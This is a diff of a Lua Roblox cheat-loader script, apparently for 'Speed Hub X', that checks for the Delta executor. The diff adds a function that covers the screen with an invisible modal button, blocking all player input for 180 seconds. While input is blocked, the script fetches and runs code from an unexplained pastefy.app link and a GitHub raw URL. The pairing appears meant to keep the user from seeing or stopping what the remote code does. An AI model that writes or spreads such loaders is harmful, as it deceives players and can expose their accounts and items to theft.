@@ -1,3 +1,4 @@
+--// Detect if Executor is Delta
 local function isDelta()
     local deltaIdentifiers = {
         identifyexecutor and identifyexecutor():lower():find("delta"),
@@ -18,7 +19,7 @@ local bgColor = Color3.fromRGB(20, 20, 20)
 local borderColor = Color3.fromRGB(255, 0, 0)
 local textColor = Color3.fromRGB(255, 255, 255)
 
---// Create Framed Window with text
+--// Create Framed Message Box
 local function createFramedMessage(name, width, height, initialText)
     local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
     gui.Name = name
@@ -48,7 +49,7 @@ local function createFramedMessage(name, width, height, initialText)
     return gui, label
 end
 
---// Show Block UI
+--// Show Delta Block UI
 local function showBlockedUI()
     local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
     gui.Name = "DeltaBlocked"
@@ -103,7 +104,29 @@ local function showBlockedUI()
     end)
 end
 
+--// Block User Input for X Seconds
+local function blockUserInput(duration)
+    local inputBlocker = Instance.new("ScreenGui", game:GetService("CoreGui"))
+    inputBlocker.Name = "InputBlocker"
+    inputBlocker.IgnoreGuiInset = true
+    inputBlocker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    local blockFrame = Instance.new("TextButton", inputBlocker)
+    blockFrame.Size = UDim2.new(1, 0, 1, 0)
+    blockFrame.Position = UDim2.new(0, 0, 0, 0)
+    blockFrame.BackgroundTransparency = 1
+    blockFrame.Text = ""
+    blockFrame.AutoButtonColor = false
+    blockFrame.Modal = true -- this captures all input
+
+    task.delay(duration, function()
+        inputBlocker:Destroy()
+    end)
+end
+
 --// Main Logic
+blockUserInput(180) -- Block all input for 3 minutes (180 seconds)
+
 local loadingUI, label = createFramedMessage("ExecutorLoading", 280, 80, "Detecting Executor...")
 task.wait(2)
 
@@ -116,6 +139,8 @@ else
     label.Text = "Speed Hub Loading..."
     task.wait(1.5)
     loadingUI:Destroy()
+
+    -- Run your script after input is blocked
     loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
 end
